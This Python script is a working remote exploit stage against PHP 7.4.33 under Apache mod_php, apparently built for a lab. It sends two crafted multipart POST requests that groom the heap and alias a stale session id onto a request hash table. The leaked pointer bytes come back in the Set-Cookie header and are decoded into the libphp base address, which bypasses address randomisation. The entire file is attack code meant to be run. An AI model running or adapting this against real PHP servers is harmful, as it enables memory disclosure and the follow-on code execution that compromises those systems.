"""HTTP-only libphp base disclosure for the pinned PHP 7.4.33 lab.

No debugger, /proc, Docker API, target-side file, displayed PHP error, or
application disclosure endpoint is used.  The stale session id aliases a real
56-byte request HashTable and is emitted through Set-Cookie.
"""
import argparse
import json
import struct
from pathlib import Path

from remote_heap_leak import cookie_bytes, multipart, post, producer, warmup

BASE = Path(__file__).resolve().parent
DTOR_OFFSET = 0x417D60


def stage2_producer():
    return producer(large_count=232, small_count=149, small_length=231,
                    name_count=62, expanded_large=15, guard_count=2,
                    slot_guard=True, small_head_length=39,
                    ht_spray_count=64, first_large_length=32500)


def stage2_consumer():
    parts = []
    for i in range(986):
        count = 9 if i == 35 else 1
        for j in range(count):
            parts.append((f"a{i:04d}[{j}]".encode(), None, b"x"))
    parts += [(b"PHPSESSID", None, b"attacksessionid0001"),
              (b"P", None, b"pwn")]
    boundary = b"B" * 10
    return multipart(parts, boundary), boundary


def decode_libphp(raw):
    if len(raw) != 16:
        return 0, 0
    nnext, destructor = struct.unpack("<QQ", raw)
    base = destructor - DTOR_OFFSET
    if nnext != 9 or not (0x700000000000 <= destructor < 0x800000000000):
        return 0, destructor
    if base & 0xFFF:
        return 0, destructor
    return base, destructor


def leak_libphp(host="127.0.0.1", port=17433, do_warmup=True):
    if do_warmup:
        warmup(host, port)
    a_body, a_boundary = stage2_producer()
    a_response = post(host, port, a_body, a_boundary)
    b_body, b_boundary = stage2_consumer()
    b_response = post(host, port, b_body, b_boundary)
    raw = cookie_bytes(b_response)
    base, destructor = decode_libphp(raw)
    return base, destructor, raw, a_response, b_response


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=17433)
    args = ap.parse_args()
    base, destructor, raw, a_response, b_response = leak_libphp(args.host,
                                                                 args.port)
    result = {
        "php_version": "7.4.33", "sapi": "Apache mod_php",
        "display_errors": "Off", "transport": "HTTP only",
        "producer_status": a_response.split(b"\r\n", 1)[0].decode("latin1", "replace"),
        "consumer_status": b_response.split(b"\r\n", 1)[0].decode("latin1", "replace"),
        "decoded_cookie_bytes": len(raw),
        "nNextFreeElement": int.from_bytes(raw[:8], "little") if len(raw) >= 8 else None,
        "zval_ptr_dtor": hex(destructor) if destructor else None,
        "zval_ptr_dtor_offset": hex(DTOR_OFFSET),
        "libphp_base": hex(base) if base else None,
    }
    evidence = BASE / "evidence"
    evidence.mkdir(exist_ok=True)
    (evidence / "remote-libphp-leak.json").write_text(
        json.dumps(result, indent=2), encoding="utf-8")
    print(json.dumps(result, indent=2))
    if not base:
        raise SystemExit("[-] HTTP libphp leak not reproduced")
    print(f"[+] HTTP-only libphp leak confirmed: {base:#x}")


if __name__ == "__main__":
    main()
